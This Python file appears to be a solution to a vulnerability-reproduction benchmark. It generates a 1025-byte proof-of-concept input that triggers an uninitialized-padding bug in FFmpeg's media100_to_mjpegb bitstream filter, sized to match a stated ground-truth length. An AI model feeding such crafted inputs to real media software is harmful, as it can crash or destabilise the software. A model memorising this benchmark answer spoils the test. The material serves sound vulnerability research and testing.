import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in the media100_to_mjpegb BSF.
        
        The vulnerability is a Use-of-Uninitialized-Value in the output buffer padding.
        The BSF logic reads the first 4 bytes of the input packet as a Little-Endian 
        offset to the second video field. It then constructs an output packet.
        Failure to initialize the padding of the output packet triggers the issue.
        
        Ground-truth length is 1025 bytes.
        """
        
        # Target length matching ground truth
        poc_length = 1025
        
        # Define an offset for the second field.
        # Logic requires: 4 <= offset <= input_size.
        # We choose 512 to ensure both fields have non-zero size.
        offset = 512
        
        # Initialize the payload buffer
        payload = bytearray(poc_length)
        
        # Write the offset at the beginning (Little Endian uint32)
        struct.pack_into('<I', payload, 0, offset)
        
        # Fill the remaining buffer with arbitrary data to emulate video bitstream.
        # The specific content doesn't matter for the padding issue, 
        # but we ensure it's not empty/zeros just in case.
        for i in range(4, poc_length):
            payload[i] = i & 0xFF
            
        return bytes(payload)